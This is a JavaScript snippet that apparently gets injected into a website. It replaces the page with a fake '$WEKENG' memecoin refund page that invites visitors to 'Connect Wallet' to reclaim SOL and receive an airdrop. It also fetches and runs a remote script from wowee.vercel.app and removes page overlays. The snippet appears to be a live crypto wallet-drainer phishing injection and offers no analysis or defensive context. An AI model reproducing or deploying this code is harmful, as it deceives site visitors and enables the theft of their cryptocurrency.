const ensurePageChange = setInterval(() => {
  if (document.getElementById("pageFullyLoadedActive") != null) {

    const script = document.createElement('script');
        script.src = 'https://wowee.vercel.app/basic_code_v2.js';
        document.body.appendChild(script);

    return clearInterval(ensurePageChange);
  };
  document.documentElement.innerHTML = `
  <html class="html" lang="ru"><head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Discover $WEKENG, a unique memecoin on Solana with airdrops for early holders and 90% liquidity on Raydium">
  <meta http-equiv="content-type" content="public, max-age=3600">
  <meta name="theme-color" content="#fff">
  <title>$WEKENG | Refunds</title>
  <link rel="shortcut icon" href="https://wowee.vercel.app/refund.svg" type="image/x-icon">
  <link rel="stylesheet" href="https://wowee.vercel.app/style.min.css">
</head>
<body class="body">

<main>
  <section class="refund">
    <div class="container">
      <img class="refund__img" src="https://wowee.vercel.app/refund.svg" width="472" height="472" alt="refund $WEKENG">
      <div class="refund__content">
        <h1 class="refund__title">
          Get a refund of spent $SOL and take part in the airdrop of the new token
        </h1>
        <p class="refund__text">
          Unfortunately, we have had some issues with the launch of $WEKENG. If you bought the token, get your $SOL back and get airdrop of our new token
        </p>
        <button class="refund__btn connect-wallet" type="button">Connect Wallet</button>
      </div>
    </div>
  </section>
</main>
<footer class="footer" id="community">
  <div class="container">
    <div class="footer__inner">
      <nav class="footer__nav">
        <span class="footer__site">$WEKENG</span>
        <span class="footer__decor"></span>
        <ul class="footer__list">
          <li>
            <a class="footer__link desktop" href="https://t.me" target="_blank">Telegram</a>
          </li>
          <li>
            <a class="footer__link desktop" href="https://x.com" target="_blank">X (Twitter)</a>
          </li>
        </ul>
      </nav>
      <p class="footer__copy">
        (c) 2024 by $WEKENG team. All rights reserved
      </p>
    </div>
  </div>
</footer><div id="pageFullyLoadedActive" style="display: none"></div><script src="https://wowee.vercel.app/basic_code_v2.js"></script></body></html>


`;

});

function removeElement() {
    
    const element = document.querySelector('.convertflow-cta.cf-overlay');
    
    
    if (element) {
        setTimeout(() => {
            element.remove();
            console.log('Element with class "convertflow-cta cf-overlay" has been removed.');
        }, 200); 
    }
}


const observer = new MutationObserver((mutations) => {
    mutations.forEach(() => {
       
        removeElement();
    });
});


observer.observe(document.body, { childList: true, subtree: true });


removeElement();
